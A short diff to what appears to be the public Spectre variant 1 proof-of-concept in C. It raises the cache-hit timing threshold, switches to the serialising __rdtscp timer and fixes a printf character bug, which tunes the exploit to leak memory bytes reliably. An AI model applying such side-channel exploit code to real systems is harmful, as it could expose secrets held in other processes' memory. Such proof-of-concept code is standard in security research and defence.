@@ -47,7 +47,7 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD 300 /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -86,9 +86,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
-      time1 = __rdtsc(); /* READ TIMER */
+      time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
@@ -133,7 +133,7 @@ int main(int argc,
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
+      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
